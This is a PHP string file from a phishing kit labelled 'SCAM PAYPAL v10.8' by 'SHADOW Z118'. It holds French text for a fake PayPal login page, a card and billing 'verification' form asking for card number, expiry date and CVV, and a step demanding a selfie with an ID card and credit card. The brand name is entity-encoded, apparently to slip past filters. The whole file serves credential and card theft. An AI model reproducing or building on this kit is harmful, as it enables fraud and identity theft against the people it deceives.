<?php
/*   
   _____   _                   _                        ______    __    __     ___  
  / ____| | |                 | |                      |___  /   /_ |  /_ |   / _ \ 
 | (___   | |__     __ _    __| |   ___   __      __      / /    | |   | |   | (_) |
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /     / /   - | | - | | -  > _ < 
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /     / /__  - | | - | | - | (_) |
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     /_____|   |_|   |_|    \___/ 
                                                                                
                              #=======================#
                              #   SCAM PAYPAL v10.8   #
                              #      SHADOW Z118      #
                              #=======================#
							  
                $$$$$$$\                     $$$$$$$\           $$\   
                $$  __$$\                    $$  __$$\          $$ |  
                $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |  
                $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |  
                $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |  
                $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  
                $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  
                \__|      \_______| \____$$ |\__|      \_______|\__|  
                                   $$\   $$ |                         
                                   \$$$$$$  |                         
                                    \______/                          
*/
session_start();
error_reporting(0); 
/////////// INDEX LOGIN ///////////////////////////////////////////
$Z118_01 = "Connectez-vous &agrave; votre compte &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; ";
$Z118_02 = "Email";
$Z118_03 = "Mot de passe";
$Z118_04 = "Entrez votre adresse email.";
$Z118_05 = "Entrez votre mot de passe.";
$Z118_06 = "Connexion";
$Z118_07 = "Vous n&#39;arrivez pas &agrave; vous connecter ?";
$Z118_08 = "Ouvrir un compte";
$Z118_09 = "Respect de la vie priv&eacute;e";
$Z118_10 = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;";
$Z118_11 = "Copyright © 1999-".date('Y')." &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;&#x2E;&#x20;&#x41;&#x6C;&#x6C;&#x20;&#x72;&#x69;&#x67;&#x68;&#x74;&#x73;&#x20;&#x72;&#x65;&#x73;&#x65;&#x72;&#x76;&#x65;&#x64;&#x2E;";
$Z118_12 = "V&eacute;rification de vos informations ...";
$Z118_13 = "Certaines de vos informations sont incorrectes. R&eacute;essayez.";
/////////// INDEX BILLING/CARDING/SUCCESS //////////////////////////////////////////
$Z118_title         = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; S&eacute;curit&eacute;";
$Z118_securityLock  = "Votre s&eacute;curit&eacute; est notre priorit&eacute;";
$Z118_verify        = "V&eacute;rifiez votre compte";
$Z118_pargraphe     = "Cher client, veuillez saisir les informations de votre compte correctement et correspondre aux informations de votre carte.";
$Z118_update_card   = "Informations de paiement";
$Z118_cardholder    = "Nom du titulaire";
$Z118_cardnumber    = "Num&eacute;ro de carte";
$Z118_expdate       = "Date d&#39;expiration";
$Z118_csc           = "CVV (3 chiffres)";
$Z118_update_bill   = "Adresse de facturation";
$Z118_fullname      = "Nom Complet";
$Z118_address       = "Ligne d'adresse";
$Z118_city          = "Ville";
$Z118_state         = "Etat";
$Z118_zipCode       = "Code Postal";
$Z118_mobile        = "Mobile";
$Z118_home          = "Home";
$Z118_phoneNumber   = "Phone Number";
$Z118_agree         = "En cliquant sur Accepter et continuer, j&#39;ai lu et j&#39;accepte l&#39;Accord d'utilisation de &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; ";
$Z118_user_agrement = "Accord de l&#39;utilisateur";
$Z118_privacy       = "Politique de confidentialit&eacute;";
$Z118_and           = " et ";
$Z118_policy        = "Politique de livraison des communications &eacute;lectroniques";
$Z118_submit        = "Αgree & Continuer";
$Z118_fPrivacy      = "Respect de la vie priv&eacute;e";
$Z118_flegal        = "Legal";
$Z118_fHelpCenter   = "Centre d'aide";
$Z118_success       = "Toutes nos f&eacute;licitations !";
$Z118_successp      = "Cher(e) ".$_SESSION['_fullname_'].", Votre compte &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; a &eacute;t&eacute; v&eacute;rifi&eacute; avec succ&egrave;s. Vous serez automatiquement redirig&eacute; vers la page de connexion en 5 secondes.";
$Z118_billing       = "Informations sur l&#39;adresse de facturation";
$Z118_carding       = "Informations sur la carte de paiement";
/////////// INDEX CONFIRM IDENTITY ////////////////////////////////////////// 
$Z118_id_title      = "Confirmez votre identit&eacute;";
$Z118_id_parag      = "Vos documents d&#39;identification nous aideront &agrave; valider votre identit&eacute;.";
$Z118_id_ask        = "Que dois-je faire pour confirmer mon identit&eacute; ?";
$Z118_id_li_1       = "Prenez un selfie en tenant votre carte d&#39;identit&eacute; &eacute;galement votre carte de cr&eacute;dit";
$Z118_id_li_2       = "Le nom du titulaire de la carte de cr&eacute;dit et la carte d&#39;identit&eacute; doivent correspondre et &ecirc;tre clairement visibles.";
$Z118_id_li_3       = "Votre document d&#39;identification doit &ecirc;tre &agrave; votre port&eacute;e.";
$Z118_id_example    = "Voici un exemple pour l&#39;vimage :";
?>